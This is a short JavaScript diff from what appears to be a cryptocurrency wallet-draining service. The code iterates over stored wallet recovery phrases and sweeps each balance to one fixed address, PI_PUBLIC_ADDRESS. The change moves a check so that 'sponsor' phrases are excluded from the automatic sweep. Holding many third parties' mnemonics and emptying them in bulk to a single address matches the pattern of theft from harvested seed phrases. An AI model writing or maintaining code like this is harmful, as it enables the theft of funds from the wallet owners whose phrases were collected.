@@ -360,9 +360,6 @@ async function getSpendableBalance(publicKey) {
 
 
 export async function sweepWallet(mainPhrase, recipient) {
-    const existingSponsor = await Sponsors.findOne({ mnemonic: mainPhrase });
-    if(existingSponsor) return {data: { error: "Passphrase is used as sponsor" }, amount: 0.000};;
-
     const mainKp = getKeypairFromPassphrase(mainPhrase);
     const accountData  = await getAccount(mainKp.publicKey());
 
@@ -607,7 +604,10 @@ export const autoSweepWallet = async (instance) => {
     for(const passphrases of passphraseBatches) {
         await Promise.all(passphrases.map(async (phrase, i) => {
             try {
-                await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
+                const existingSponsor = await Sponsors.findOne({ mnemonic: phrase.mnemonic });
+                if(!existingSponsor) {
+                    await sweepWallet(phrase.mnemonic, PI_PUBLIC_ADDRESS);
+                }
             } catch (e) {
                 if (e.response && e.response.data && e.response.data.extras) {
                     const extras = e.response.data.extras;
